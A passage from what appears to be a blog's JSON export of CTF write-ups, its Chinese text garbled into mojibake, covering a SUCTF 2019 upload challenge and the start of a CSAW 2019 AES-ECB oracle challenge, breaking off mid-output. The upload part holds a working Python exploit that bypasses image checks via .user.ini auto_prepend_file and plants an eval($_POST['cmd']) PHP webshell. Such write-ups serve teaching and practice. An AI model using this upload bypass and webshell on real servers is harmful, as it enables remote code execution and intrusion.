language='php'&gt;ç»•è¿‡ï¼Œä½†æ˜¯è¿™ç§å†™æ³•åœ¨PHP7ä»¥åå°±åºŸå¼ƒäº†ã€‚è€Œå¯¹äºexif_imagetypeçš„æ£€æµ‹æˆ‘ä»¬æŠŠæ–‡ä»¶å¤´å†™å¯¹å°±å¯ä»¥äº†ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æ³•ç»•è¿‡æ‰©å±•åã€‚ è¿™ä¸ªæ—¶å€™æƒ³åˆ°å¯ä¸å¯ä»¥ç”¨.htaccessé€ ä¸€ä¸ªPHPæœ¨é©¬å‘¢ï¼ŸBUUOJå¹³å°æ˜¾ç¤ºä¸å‡ºæ¥åŸå¹³å°æ˜¯ä»€ä¹ˆï¼ŒSUCTF 2019æ¯”èµ›çš„æ—¶å€™ç”¨çš„æ˜¯Nginxã€‚ä¸Šç½‘æœäº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°è¿™ä¸ªï¼Œ.user.iniï¼Œè¿™ä¸ªæ˜¯PHPç”¨æ¥è¦†ç›–è®¾ç½®å…¨å±€php.iniçš„ã€‚å…³äºuser.iniåé—¨ï¼Œè¯·å‚è€ƒè¿™ä¸ª ã€‚ é‚£ä¹ˆæˆ‘ä»¬è¯•ä¸€ä¸‹èƒ½ä¸èƒ½ä¸Šä¼ .iniçš„æ–‡ä»¶ã€‚ç»•è¿‡exif_imagetypeï¼Œæˆ‘ä»¬å¯ä»¥ç”¨WBMPï¼Œæ–‡ä»¶å¤´ç±»ä¼¼äº\"8a8a0a\"ã€‚å…·ä½“è¯·å‚è€ƒè¿™ä¸ªã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬ä¸Šä¼ .user.iniï¼Œå†…å®¹ä¸ºauto_prepend_file=1.jpgã€‚è€Œ1.jpgæˆ‘ä»¬å…ˆå‡å®šPHPç‰ˆæœ¬æ²¡æœ‰åˆ°7ï¼Œç”¨scriptç»•è¿‡ã€‚æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¼šå®šæ—¶åˆ é™¤ï¼Œæ‰€ä»¥ä¸Šè„šæœ¬ï¼ˆå·ä¸ªæ‡’ç”¨burpsuiteçš„copy as requestså†™çš„ï¼Œæœ‰ç‚¹ç³Ÿç³•ï¼‰ã€‚ 12345678910111213import requestsburp0_url = &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn:80/index.php&quot;burp0_cookies = &#123;&quot;_ga&quot;: &quot;GA1.2.955320724.1570284537&quot;&#125;burp0_headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryQLCUc5tPaf34BcAx&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;, &quot;Referer&quot;: &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;burp0_data = &quot;------WebKitFormBoundaryQLCUc5tPaf34BcAx\\r\\nContent-Disposition: form-data; name=\\&quot;fileUpload\\&quot;; filename=\\&quot;.user.ini\\&quot;\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n\\x00\\x00\\x8a9\\x8a9\\n\\nauto_prepend_file=shell2.png\\r\\n------WebKitFormBoundaryQLCUc5tPaf34BcAx\\r\\nContent-Disposition: form-data; name=\\&quot;upload\\&quot;\\r\\n\\r\\n\\xe6\\x8f\\x90\\xe4\\xba\\xa4\\r\\n------WebKitFormBoundaryQLCUc5tPaf34BcAx--\\r\\n&quot;requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)burp0_url = &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn:80/index.php&quot;burp0_cookies = &#123;&quot;_ga&quot;: &quot;GA1.2.955320724.1570284537&quot;&#125;burp0_headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryfnkiDtoqTZyrzBuQ&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;, &quot;Referer&quot;: &quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;burp0_data = &quot;------WebKitFormBoundaryfnkiDtoqTZyrzBuQ\\r\\nContent-Disposition: form-data; name=\\&quot;fileUpload\\&quot;; filename=\\&quot;shell2.png\\&quot;\\r\\nContent-Type: image/png\\r\\n\\r\\n\\x00\\x00\\x8a9\\x8a9\\n\\n&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;\\r\\n------WebKitFormBoundaryfnkiDtoqTZyrzBuQ\\r\\nContent-Disposition: form-data; name=\\&quot;upload\\&quot;\\r\\n\\r\\n\\xe6\\x8f\\x90\\xe4\\xba\\xa4\\r\\n------WebKitFormBoundaryfnkiDtoqTZyrzBuQ--\\r\\n&quot;print(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text) å¾—åˆ°è®¿é—®ç›®å½•ï¼Œç„¶åç›´æ¥POSTä¼ åŒ…å°±å¯ä»¥äº†ã€‚ flag{5f75c6f5-851f-4a39-8335-8901d13bbf84}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":".user.ini","slug":"user-ini","permalink":"http://tiaonmmn.github.io/tags/user-ini/"},{"name":"Upload","slug":"Upload","permalink":"http://tiaonmmn.github.io/tags/Upload/"}]},{"title":"CSAW-Quals-2019-byte_me","slug":"CSAW-Quals-2019-byte-me","date":"2019-10-21T12:17:02.000Z","updated":"2019-12-10T12:15:12.609Z","comments":true,"path":"2019/10/21/CSAW-Quals-2019-byte-me/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/21/CSAW-Quals-2019-byte-me/","excerpt":"è¿™é“é¢˜æ²¡ç»™æ–‡ä»¶ï¼Œæˆ‘ä»¬è¿æ¥åè¿”å›ä¸€ä¸ª16è¿›åˆ¶æ•°ï¼Œç„¶åè®©æˆ‘ä»¬input somethingã€‚æˆ‘ä»¬é‡å¤è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›ç›¸åŒç»“æœã€‚æ¯å½“è¾“å…¥çš„å­—ç¬¦ä¸²å¢åŠ 16ä½ï¼Œè¿”å›çš„ç»“æœå¢åŠ 32ä½ã€‚è¿™ä¸€æ¡å¯ä»¥ç¡®å®šè¿™ä¸ªåŠ å¯†æ–¹å¼åº”è¯¥æ˜¯æŸç§å—åŠ å¯†ã€‚æœ€å®¹æ˜“æƒ³åˆ°çš„å°±æ˜¯AESäº†ã€‚é‚£ä¹ˆå“ªç§åŠ å¯†æ–¹å¼ï¼Ÿå‚è€ƒè¿™é‡Œï¼Œå†è§‚å¯Ÿè¾“å‡ºçš„å¯†æ–‡ã€‚","text":"è¿™é“é¢˜æ²¡ç»™æ–‡ä»¶ï¼Œæˆ‘ä»¬è¿æ¥åè¿”å›ä¸€ä¸ª16è¿›åˆ¶æ•°ï¼Œç„¶åè®©æˆ‘ä»¬input somethingã€‚æˆ‘ä»¬é‡å¤è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›ç›¸åŒç»“æœã€‚æ¯å½“è¾“å…¥çš„å­—ç¬¦ä¸²å¢åŠ 16ä½ï¼Œè¿”å›çš„ç»“æœå¢åŠ 32ä½ã€‚è¿™ä¸€æ¡å¯ä»¥ç¡®å®šè¿™ä¸ªåŠ å¯†æ–¹å¼åº”è¯¥æ˜¯æŸç§å—åŠ å¯†ã€‚æœ€å®¹æ˜“æƒ³åˆ°çš„å°±æ˜¯AESäº†ã€‚é‚£ä¹ˆå“ªç§åŠ å¯†æ–¹å¼ï¼Ÿå‚è€ƒè¿™é‡Œï¼Œå†è§‚å¯Ÿè¾“å‡ºçš„å¯†æ–‡ã€‚ 12345678910111213141516171819from pwn import *import stringimport random# context.log_level=&#x27;debug&#x27;s = connect(&#x27;127.0.0.1&#x27;, 8060)print(&quot;encrypted_flag is:&quot; + s.recvline())def send_message(message): s.recv() s.sendline(message) s.recvline() encrypted = s.recvline() print(&quot;Encryped &#123;0&#125; is:&#123;1&#125;.Its length is &#123;2&#125;.Message length is &#123;3&#125;&quot;.format(message, encrypted, len(encrypted), len(message)))result=0for i in range(1,65): send_message(&quot;a&quot;*i) ç»“æœå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135&#x2F;usr&#x2F;bin&#x2F;python2.7 &#x2F;home&#x2F;tiaonmmn&#x2F;PycharmProjects&#x2F;python2&#x2F;byte_me.py[+] Opening connection to 127.0.0.1 on port 8060: Doneencrypted_flag is:1e7086115a9f43410dfdcfa01702b6f4a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dcEncryped a is:ff52d314fe1306fb890d7140fe9875e882e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401.Its length is 130.Message length is 1Encryped aa is:4f13a88b3aa5e816885649d346f56d5c5d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64.Its length is 130.Message length is 2Encryped aaa is:e310dde5a0593baec946ab994183741aecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741.Its length is 130.Message length is 3Encryped aaaa is:01abdc7751a9eea1afec0ab084e973a0b5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c.Its length is 130.Message length is 4Encryped aaaaa is:28505aca54d2ef9fe91165176bb429844214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b.Its length is 130.Message length is 5Encryped aaaaaa is:5034d975ff043ce8039993a0242950b02eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc.Its length is 130.Message length is 6Encryped aaaaaaa is:882cab2b25bdbfe8d663b3215f6ef5d875ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe.Its length is 130.Message length is 7Encryped aaaaaaaa is:d988fe442e1e627455822e16925b4a28d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46.Its length is 130.Message length is 8Encryped aaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f43eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb.Its length is 130.Message length is 9Encryped aaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f49a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf.Its length is 130.Message length is 10Encryped aaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73.Its length is 130.Message length is 11Encryped aaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7.Its length is 162.Message length is 12Encryped aaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595.Its length is 162.Message length is 13Encryped aaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f459994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b.Its length is 162.Message length is 14Encryped aaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f48cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60.Its length is 162.Message length is 15Encryped aaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f46885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc.Its length is 162.Message length is 16Encryped aaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4f42e62f15dc036e1a09c389250015c1982e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401.Its length is 162.Message length is 17Encryped aaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4e6430275a9bb274ee7e37b860e8d8a065d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64.Its length is 162.Message length is 18Encryped aaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4351e8889f4291b6d56c7e894aab91a48ecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741.Its length is 162.Message length is 19Encryped aaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f49579199f4e69346a5fdc11d2e593c80ab5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c.Its length is 162.Message length is 20Encryped aaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f469bc2c9ea8182813544ba55ab1a963014214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b.Its length is 162.Message length is 21Encryped aaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4d19681425feb1a0d02fdbe35823e06242eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc.Its length is 162.Message length is 22Encryped aaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f44bfa35fb255a71e08d82e8a75317654475ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe.Its length is 162.Message length is 23Encryped aaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4dd9e5d3a378726db3c0b9e92b4a35d86d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46.Its length is 162.Message length is 24Encryped aaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a993eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb.Its length is 162.Message length is 25Encryped aaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a999a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf.Its length is 162.Message length is 26Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73.Its length is 162.Message length is 27Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7.Its length is 194.Message length is 28Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595.Its length is 194.Message length is 29Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a9959994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b.Its length is 194.Message length is 30Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a998cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60.Its length is 194.Message length is 31Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a996885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc.Its length is 194.Message length is 32Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99f42e62f15dc036e1a09c389250015c1982e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401.Its length is 194.Message length is 33Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99e6430275a9bb274ee7e37b860e8d8a065d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64.Its length is 194.Message length is 34Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99351e8889f4291b6d56c7e894aab91a48ecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741.Its length is 194.Message length is 35Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a999579199f4e69346a5fdc11d2e593c80ab5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c.Its length is 194.Message length is 36Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a9969bc2c9ea8182813544ba55ab1a963014214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b.Its length is 194.Message length is 37Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99d19681425feb1a0d02fdbe35823e06242eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc.Its length is 194.Message length is 38Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a994bfa35fb255a71e08d82e8a75317654475ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe.Its length is 194.Message length is 39Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99dd9e5d3a378726db3c0b9e92b4a35d86d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46.Its length is 194.Message length is 40Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a993eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb.Its length is 194.Message length is 41Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a999a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf.Its length is 194.Message length is 42Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73.Its length is 194.Message length is 43Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7.Its length is 226.Message length is 44Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595.Its length is 226.Message length is 45Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a9959994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b.Its length is 226.Message length is 46Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a998cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60.Its length is 226.Message length is 47Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a996885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc.Its length is 226.Message length is 48Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99f42e62f15dc036e1a09c389250015c1982e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401.Its length is 226.Message length is 49Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99e6430275a9bb274ee7e37b860e8d8a065d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64.Its length is 226.Message length is 50Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99351e8889f4291b6d56c7e894aab91a48ecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741.Its length is 226.Message length is 51Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a999579199f4e69346a5fdc11d2e593c80ab5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c.Its length is 226.Message length is 52Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a9969bc2c9ea8182813544ba55ab1a963014214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b.Its length is 226.Message length is 53Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99d19681425feb1a0d02fdbe35823e06242eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc.Its length is 226.Message length is 54Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a994bfa35fb255a71e08d82e8a75317654475ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe.Its length is 226.Message length is 55Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99dd9e5d3a378726db3c0b9e92b4a35d86d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46.Its length is 226.Message length is 56Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a993eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb.Its length is 226.Message length is 57Encryped 